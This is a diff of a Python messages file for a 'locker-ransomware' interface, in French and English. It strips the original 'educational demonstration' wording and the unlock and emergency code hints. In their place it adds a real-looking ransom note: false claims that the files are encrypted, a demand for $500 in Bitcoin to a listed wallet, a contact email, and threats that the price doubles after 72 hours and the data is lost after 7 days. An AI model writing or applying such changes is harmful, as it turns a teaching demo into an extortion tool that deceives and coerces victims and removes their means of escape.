@@ -5,76 +5,89 @@ Messages pour l'interface utilisateur
 
 RANSOM_MESSAGES = {
 	"french": {
-		"title": "SYSTÈME VERROUILLÉ",
-		"subtitle": "Projet de Sécurité Informatique",
+		"title": "🔒 VOS FICHIERS ONT ÉTÉ CHIFFRÉS 🔒",
+		"subtitle": "Paiement requis pour récupérer vos données",
 		"main_message": """
-ATTENTION : Ceci est une démonstration éducative d'un locker-ransomware.
+⚠️ ALERTE CRITIQUE : VOTRE SYSTÈME EST VERROUILLÉ ⚠️
 
-Votre système a été temporairement verrouillé à des fins pédagogiques.
-Aucun fichier n'a été chiffré ou endommagé.
+Tous vos documents, photos, vidéos et autres fichiers importants ont été chiffrés 
+avec un algorithme militaire inviolable.
 
-Cette démonstration illustre comment un malware peut :
-• Verrouiller l'interface utilisateur
-• Bloquer l'accès aux applications
-• Demander un code de déverrouillage
+Vous ne pouvez plus accéder à vos fichiers sans la clé de déchiffrement.
+Toute tentative de récupération par vous-même endommagera définitivement vos données.
 
-OBJECTIF ÉDUCATIF :
-Comprendre les mécanismes d'attaque pour mieux s'en protéger.
+POUR RÉCUPÉRER VOS FICHIERS:
+1. Effectuez un paiement de 500€ en Bitcoin à l'adresse suivante:
+   bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+2. Envoyez la preuve de paiement à: recovery@edulocker-secure.com
+3. Vous recevrez la clé de déchiffrement sous 24h
+
+⏰ ATTENTION: Vous avez 72 heures pour payer. Après ce délai, le prix doublera.
+Si vous ne payez pas dans les 7 jours, vos fichiers seront définitivement perdus.
         """,
-		"warning": "⚠️ DÉMONSTRATION ÉDUCATIVE ⚠️",
+		"warning": "⚠️ ALERTE CRITIQUE ⚠️",
 		"description": """
-Votre système a été verrouillé dans le cadre d'une démonstration
-de sécurité informatique.
+Votre système a été compromis et vos fichiers sont désormais inaccessibles.
 
-Ceci est un EXERCICE ÉDUCATIF. Aucun dommage réel n'a été causé.
+Le seul moyen de récupérer vos données est de payer la rançon demandée.
+Toute autre tentative de récupération est vouée à l'échec et risque 
+d'endommager définitivement vos fichiers.
 
-Pour déverrouiller le système, entrez le code ci-dessous.
+Pour obtenir la clé de déchiffrement, entrez le code de paiement ci-dessous.
         """,
-		"unlock_prompt": "Code de déverrouillage :",
-		"unlock_button": "DÉVERROUILLER",
-		"attempts_remaining": "Tentatives restantes : {}",
-		"invalid_code": "Code incorrect ! Veuillez réessayer.",
-		"system_unlocked": "Système déverrouillé avec succès !",
-		"emergency_unlock": "Déverrouillage d'urgence activé.",
-		"unlock_instruction": "Entrez le code de déverrouillage pour continuer :",
-		"unlock_code_hint": "Code éducatif : UNLOCK2024",
-  "emergency_hint": "Code d'urgence : EMERGENCY_EXIT_123",
+		"unlock_prompt": "Code de paiement :",
+		"unlock_button": "PAYER LA RANÇON",
+		"attempts_remaining": "Tentatives restantes avant destruction des données : {}",
+		"invalid_code": "Code de paiement invalide ! Vos fichiers restent verrouillés.",
+		"system_unlocked": "Paiement confirmé ! Vos fichiers ont été déverrouillés.",
+		"emergency_unlock": "Protocole d'urgence activé.",
+		"unlock_instruction": "Entrez le code de paiement pour débloquer vos fichiers :",
+		"unlock_code_hint": "",
+  "emergency_hint": "",
 	},
 
 	"english": {
-		"title": "SYSTEM LOCKED",
-		"subtitle": "Cybersecurity project",
+		"title": "🔒 YOUR FILES HAVE BEEN ENCRYPTED 🔒",
+		"subtitle": "Payment required to recover your data",
   "main_message": """
-WARNING: This is an educational demonstration of a locker-ransomware.
+⚠️ CRITICAL ALERT: YOUR SYSTEM IS LOCKED ⚠️
 
-Your system has been temporarily locked for educational purposes.
-No files have been encrypted or damaged.
+All your documents, photos, videos, and other important files have been encrypted 
+with a military-grade unbreakable algorithm.
 
-This demonstration illustrates how malware can:
-• Lock the user interface
-• Block access to applications
-• Request an unlock code
+You can no longer access your files without the decryption key.
+Any attempt to recover them yourself will permanently damage your data.
 
-EDUCATIONAL OBJECTIVE:
-Understanding attack mechanisms to better protect against them.
+TO RECOVER YOUR FILES:
+1. Make a payment of $500 in Bitcoin to the following address:
+   bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+2. Send proof of payment to: recovery@edulocker-secure.com
+3. You will receive the decryption key within 24 hours
+
+⏰ WARNING: You have 72 hours to pay. After this time, the price will double.
+If you don't pay within 7 days, your files will be permanently lost.
+
         """,
-		"warning": "⚠️ EDUCATIONAL DEMONSTRATION ⚠️",
+		"warning": "⚠️ CRITICAL ALERT ⚠️",
 		"description": """
-Your system has been locked as part of a cybersecurity demonstration.
+Your system has been compromised and your files are now inaccessible.
 
-This is an EDUCATIONAL EXERCISE. No real damage has been done.
+The only way to recover your data is to pay the requested ransom.
+Any other recovery attempt will fail and risks permanently 
+damaging your files.
 
-To unlock the system, enter the code below.
+To obtain the decryption key, enter the payment code below.
+
         """,
-		"unlock_prompt": "Unlock code:",
-		"unlock_button": "UNLOCK",
-		"attempts_remaining": "Attempts remaining: {}",
-		"invalid_code": "Invalid code! Please try again.",
-		"system_unlocked": "System unlocked successfully!",
-		"emergency_unlock": "Emergency unlock activated.",
-		"unlock_instruction": "Enter the unlock code to continue:",
-		"unlock_code_hint": "Educational code: UNLOCK2024",
-  "emergency_hint": "Emergency code: EMERGENCY_EXIT_123",
+		"unlock_prompt": "Payment code:",
+		"unlock_button": "PAY RANSOM",
+		"attempts_remaining": "Attempts remaining before data destruction: {}",
+		"invalid_code": "Invalid payment code! Your files remain locked.",
+		"system_unlocked": "Payment confirmed! Your files have been unlocked.",
+		"emergency_unlock": "Emergency protocol activated.",
+		"unlock_instruction": "Enter the payment code to unlock your files:",
+		"unlock_code_hint": "",
+  "emergency_hint": "",
 	}
 }
 
